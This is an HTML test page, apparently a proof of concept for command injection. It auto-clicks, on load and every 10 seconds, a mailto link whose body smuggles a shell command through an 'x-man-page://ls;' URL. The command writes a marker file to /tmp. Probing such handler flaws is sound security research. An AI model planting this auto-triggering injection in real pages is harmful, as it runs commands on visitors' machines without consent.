<!DOCTYPE html>
<html>
<head>
    <title>Single Auto-Trigger mailto Test</title>
</head>
<body>
    <h1>mailto Auto-Trigger Test</h1>
    <p>This page will automatically trigger a mailto link every 10 seconds.</p>
    
    <!-- The link that will be auto-clicked -->
    <a href="mailto:test@test.com?subject=Urgent&body=x-man-page://ls;echo%20AUTO_TRIGGER%20%3E%20%2Ftmp%2Fauto_test.txt" 
       id="autoMailtoLink"
       style="display: block; margin: 20px 0; color: blue;">
        Manual Trigger: Send Test Email
    </a>
    
    <script>
        // Auto-click the mailto link every 10 seconds
        setInterval(() => {
            console.log("Auto-clicking mailto link...");
            document.getElementById('autoMailtoLink').click();
        }, 10000); // 10 seconds instead of 50
        
        // Also trigger once immediately
        setTimeout(() => {
            document.getElementById('autoMailtoLink').click();
        }, 1000);
    </script>
</body>
</html>
